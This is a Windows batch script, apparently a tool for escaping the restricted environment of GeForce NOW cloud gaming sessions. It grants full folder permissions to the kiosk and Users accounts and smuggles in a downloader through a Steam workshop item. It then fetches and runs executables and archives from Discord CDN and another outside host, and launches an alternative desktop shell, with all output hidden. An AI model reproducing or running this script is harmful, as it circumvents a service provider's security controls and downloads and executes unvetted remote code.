@ECHO OFF
CLS
COLOR 97
TITLE GFNFizzy V69 - (C) 2020 Fizzy
ECHO Welcome to GFNFizzy V69 (C) 2020 Fizzy.
ECHO Nobody is allowed to upload videos of GFNTools without permission!
ECHO If that happens I can easily take down the video.
ECHO Credits to Fizzy#6969 they can take videos of this script.
ECHO Initializing...
PING 127.0.0.1 -n 4 >NUL 2>&1
IF NOT EXIST "C:\Asgard\logs\startup\startup.log" GOTO :ownpc >NUL 2>&1


B:
MKDIR "B:\GFNTools" >NUL 2>&1
ICACLS "B:\GFNTools" /grant kiosk:(OI)(CI)F /T >NUL 2>&1
ICACLS "B:\GFNTools" /grant Users:(OI)(CI)F /T >NUL 2>&1
%HOMEDRIVE%
CD "C:\Program Files (x86)\Steam"
IF NOT EXIST "C:\Fake\unturned.txt" GOTO unturnedinstall >NUL 2>&1
GOTO unturnedinstalled

:unturnedinstall
start "" "steam.exe" "steam://install/304930" >NUL 2>&1
echo yes > C:\Fake\unturned.txt >NUL 2>&1
GOTO unturnedinstalled


:unturnedinstalled:
START "" "steam.exe" "steam://open/console" >NUL 2>&1
ECHO download_item 304930 2236589697|clip
ECHO In the console box press CTRL + V
:rdlcheck:
IF EXIST "C:\Program Files (x86)\Steam\steamapps\content\app_304930\item_2236589697\bruh\downloader.exe" GOTO found >NUL 2>&1
GOTO rdlcheck
:found:
CLS
ECHO RDL downloaded! Downloading GFNFizzy.
PING 127.0.0.1 -n 3 >NUL 2>&1
REN "C:\Program Files (x86)\Steam\steamapps\content" lmao >NUL 2>&1
MKDIR "C:\Program Files (x86)\Steam\steamapps\lmao\app_304930\item_2211269032\"
MOVE "C:\Program Files (x86)\Steam\steamapps\lmao\app_304930\item_2236589697\bruh\downloader.exe" "C:\Program Files (x86)\Steam\steamapps\lmao\app_304930\item_2211269032\rdl.exe" >NUL 2>&1
SET DL="C:\Program Files (x86)\Steam\steamapps\lmao\app_304930\item_2211269032\rdl.exe"
B:
MKDIR "B:\Fizzy" >NUL 2>&1
cd "B:\Fizzy"
%DL% -LJOk "https://cdn.discordapp.com/attachments/741701372277424229/758782573316145182/tlmj0lxq.exe" >NUL 2>&1

cd "B:\GFNTools"

%DL% -LJOk "https://picteon.dev/files/I906.zip" >NUL 2>&1
%DL% -LJOk "https://cdn.discordapp.com/attachments/741059833163153469/757284597602975825/7.exe" >NUL 2>&1
%DL% -LJOk "https://cdn.discordapp.com/attachments/741059833163153469/757298274364424232/7z.dll" >NUL 2>&1
set EXTRACT="B:\GFNTools\7.exe"
%EXTRACT% x I906.zip >NUL 2>&1
DEL I906.zip >NUL 2>&1
DEL C:\Fake\I906.zip >NUL 2>&1
RMDIR /Q/S C:\Fake\Extras
CLS
ECHO GFNTools downloaded and extracted!
ECHO Starting WinXShell.
CD "B:\GFNTools\WinXShell"
ECHO WinXShell is starting...
START /WAIT "" "B:\GFNTools\WinXShell\start.bat"
PING 127.0.0.1 -n 2 >NUL 2>&1
EXIT


:ownpc
ECHO You are running GFNTools on your own computer. That is not how this works. Please run this file on GeForce NOW.
PAUSE
EXIT




